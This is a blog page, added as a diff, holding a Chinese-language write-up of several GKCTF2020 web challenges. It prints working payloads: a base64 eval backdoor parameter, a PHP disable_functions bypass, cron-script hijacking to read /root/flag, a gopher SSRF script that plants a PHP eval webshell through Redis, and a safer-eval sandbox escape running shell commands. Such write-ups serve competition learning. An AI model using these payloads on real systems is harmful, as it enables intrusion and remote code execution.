@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+<meta name="google-site-verification" content="fQ_tfBgNjE9NQcpKnGAkWapHoKuimF5lVuNuqpPXar0">
+    <meta charset="utf-8">
+    
+    <title>GKCTF2020-CheckIN | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="" target="_blank">友情链接</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.redmango.top/" target="_blank">HhhM</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://l1near.top/" target="_blank">L1nearのspace</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+
+<div class="m-header" id="headers" >
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      GKCTF2020-CheckIN
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<p>base64加密一下可以直接RCE：</p>
+<pre><code>?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</code></pre><p>测试发现<code>tmp</code>目录是可以写东西。但是直接读flag是没法读得。但是发现有readflag这个程序在根目录，但是这里把执行系统命令的函数都给禁了，这里要bypass 一下<code>disable function</code>.</p>
+<p>直接exp一把梭：</p>
+<p><a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p>
+<p>exp上传到/var/tmp/3.txt,直接包含执行就行了。</p>
+<pre><code>http://ebd8d9e8-ee16-4153-8396-b65d3b3b95ac.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX0dFVFsnYSddKTs=&amp;a=var_dump(include(&#39;../../tmp/3.txt&#39;));</code></pre><blockquote>
+<p> echo pwn(“echo <code>/readflag</code> &gt; /var/tmp/a.txt”);</p>
+</blockquote>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200526145744.png" alt="微信图片_20200526145744"></p>
+<h2 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h2><p>直接网上搜shopX0 getshell <a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">http://www.nctry.com/1660.html</a></p>
+<p>那道shell之后呢，发现根目录下的flag是假的，还有个hint。不知道这个hint有啥用，但是在auto.sh有一个很明显的地方</p>
+<pre><code>#!/bin/sh
+while true; do (python /var/mail/makeflaghint.py &amp;) &amp;&amp; sleep 60; done</code></pre><p>这里应该设定了定时任务每60秒执行一次这个脚本，而且这个makeflaghint.py 脚本我们有权限修改。我们直接修改脚本就能读到/root/flag。</p>
+<pre><code class="python">f = open(&#39;/root/flag&#39;,&#39;r&#39;)
+f2 = open(&#39;/666.txt&#39;,&#39;w&#39;)
+flag = f.read()
+f2.write(flag)
+f.close()
+f2.close()</code></pre>
+<h2 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h2><p>这道题和安恒还是广东强网某道题基本一样。也是SSRF打Redis.</p>
+<p>SSRF对内网IP进行探测然后对端口探测发现是Redis，然后EXP一把梭。</p>
+<pre><code class="python">import urllib
+import urllib.parse
+protocol=&quot;gopher://&quot;
+ip=&quot;173.138.94.11&quot;
+port=&quot;6379&quot;
+shell=&#39;\n\n&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;\n\n&#39;
+filename=&quot;shell.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+     &quot;config set dir {}&quot;.format(path),
+     &quot;config set dbfilename {}&quot;.format(filename),
+     &quot;save&quot;
+     ]
+if passwd:
+    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+    CRLF=&quot;\r\n&quot;
+    redis_arr = arr.split(&quot; &quot;)
+    cmd=&quot;&quot;
+    cmd+=&quot;*&quot;+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+    cmd+=CRLF
+    return cmd
+
+if __name__==&quot;__main__&quot;:
+    for x in cmd:
+        payload += urllib.parse.quote(redis_format(x))
+    print(payload)</code></pre>
+<pre><code>gopher://173.138.94.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</code></pre><p>最后读flag需要绕一下空格。</p>
+<h2 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h2><pre><code>?url=http://127.0.0.123%00.ctfhub.com</code></pre><h2 id="EZ三剑客-EzNode"><a href="#EZ三剑客-EzNode" class="headerlink" title="EZ三剑客-EzNode"></a>EZ三剑客-EzNode</h2><pre><code class="javascript">const express = require(&#39;express&#39;);
+const bodyParser = require(&#39;body-parser&#39;);
+
+const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 找到一个很棒的库
+
+const fs = require(&#39;fs&#39;);
+
+const app = express();
+
+
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
+// 2020.1/WORKER2 老板说为了后期方便优化
+app.use((req, res, next) =&gt; {
+  if (req.path === &#39;/eval&#39;) {
+    let delay = 60 * 1000;
+    console.log(delay);
+    if (Number.isInteger(parseInt(req.query.delay))) {
+      delay = Math.max(delay, parseInt(req.query.delay));
+    }
+    const t = setTimeout(() =&gt; next(), delay);
+    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
+    setTimeout(() =&gt; {
+      clearTimeout(t);
+      console.log(&#39;timeout&#39;);
+      try {
+        res.send(&#39;Timeout!&#39;);
+      } catch (e) {
+
+      }
+    }, 1000);
+  } else {
+    next();
+  }
+});
+
+app.post(&#39;/eval&#39;, function (req, res) {
+  let response = &#39;&#39;;
+  if (req.body.e) {
+    try {
+      response = saferEval(req.body.e);
+    } catch (e) {
+      response = &#39;Wrong Wrong Wrong!!!!&#39;;
+    }
+  }
+  res.send(String(response));
+});
+
+// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
+app.get(&#39;/source&#39;, function (req, res) {
+  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);
+  res.send(fs.readFileSync(&#39;./index.js&#39;));
+});
+
+// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
+app.get(&#39;/version&#39;, function (req, res) {
+  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);
+  res.send(fs.readFileSync(&#39;./package.json&#39;));
+});
+
+app.get(&#39;/&#39;, function (req, res) {
+  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);
+  res.send(fs.readFileSync(&#39;./index.html&#39;))
+})
+
+app.listen(80, &#39;0.0.0.0&#39;, () =&gt; {
+  console.log(&#39;Start listening&#39;)
+});</code></pre>
+<h4 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h4><ul>
+<li><p>setTimeout ，整数溢出，Infinity或者 ⼤于 2147483647</p>
+</li>
+<li><p>safeval <a href="https://github.com/commenthol/safer-eval/issues/10" target="_blank" rel="noopener">https://github.com/commenthol/safer-eval/issues/10</a></p>
+</li>
+</ul>
+<pre><code>setInterval.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString();</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200527142405.png" alt="微信截图_20200527142405"></p>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2020-05-27T08:21:20.000Z" itemprop="datePublished">2020-05-27</time>
+	</div>
+</article>
+<!-- 目录内容 -->
+<div id='maktoc'>
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+    <div id="toc-article" class="toc-article">
+        <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+        <strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#老八小超市儿"><span class="toc-number">1.</span> <span class="toc-text">老八小超市儿</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZ三剑客-EzWeb"><span class="toc-number">2.</span> <span class="toc-text">EZ三剑客-EzWeb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve版签到"><span class="toc-number">3.</span> <span class="toc-text">cve版签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZ三剑客-EzNode"><span class="toc-number">4.</span> <span class="toc-text">EZ三剑客-EzNode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#小trick"><span class="toc-number">4.0.1.</span> <span class="toc-text">小trick</span></a></li></ol></li></ol></li></ol>
+         </div>
+   <script type="text/javascript">
+    function showToc(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribrootute("style","display:block");
+        show_toc_btn.setAttribute("style","display:none");
+        };
+    function showBtn(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribute("style","display:none");
+        show_toc_btn.setAttribute("style","display:block");
+        };
+	function getScrollTop() {
+	    var scroll_top = 0;
+	    if (document.documentElement && document.documentElement.scrollTop) {
+		scroll_top = document.documentElement.scrollTop;
+	    }
+	    else if (document.body) {
+		scroll_top = document.body.scrollTop;
+	    }
+	    return scroll_top;
+	};
+	var headers=document.getElementById("headers");
+	var tocs = document.getElementById("toc-article");
+	
+	
+	window.onscroll  = function(){
+	if(getScrollTop()>450){
+			if(tocs.offsetTop>100){
+			var tophight = tocs.offsetTop-15;
+			tocs.style.cssText="top:"+tophight+"px";
+			}
+	}else{
+			tocs.style.cssText="top:540px";
+		}
+				
+		
+		//console.log(getScrollTop());	
+		
+	}
+window.onresize = function(){
+	var mak_toc = document.getElementById("maktoc");
+	if($(window).width()<1414){
+	mak_toc.setAttribute("style","display:none");
+	}else{
+	mak_toc.setAttribute("style","display:block");
+	}
+}
+   </script>
+      
+<!-- 目录内容结束 -->
+</div>
+
+<!--评论-->
+
+	
+<div id="lv-container" data-id="city" data-uid="MTAyMC80OTc4Mi8yNjI3Mw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>兵至如归-Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+							
+							<li>
+				        		<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">
+				        			
+				        				<i class="iconfont icon-weixin"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<footer class="footer" role="contentinfo">
+
+	<div class="wrapper wrapper--wide split split--responsive">
+<a href="http://beian.miit.gov.cn/">粤ICP备18132442号-1</a><br>
+<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/gongan.png" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">粤公网安备 44011202000643号</p></a><br>
+
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="https://github.com/justpsvm">justpsvm</a>. Powered by <a href="https://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+ <script type="text/javascript"> /* 鼠标点击特效 - 7Core.CN */ var a_idx = 0;jQuery(document).ready(function($) {$("body").click(function(e) {var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");var $i = $("<span/>").text(a[a_idx]); a_idx = (a_idx + 1) % a.length;var x = e.pageX,y = e.pageY;$i.css({"z-index": 100000000,"top": y - 20,"left": x,"position": "absolute","font-weight": "bold","color": "#ff6651"});$("body").append($i);$i.animate({"top": y - 180,"opacity": 0},1500,function() {$i.remove();});});}); </script>
+
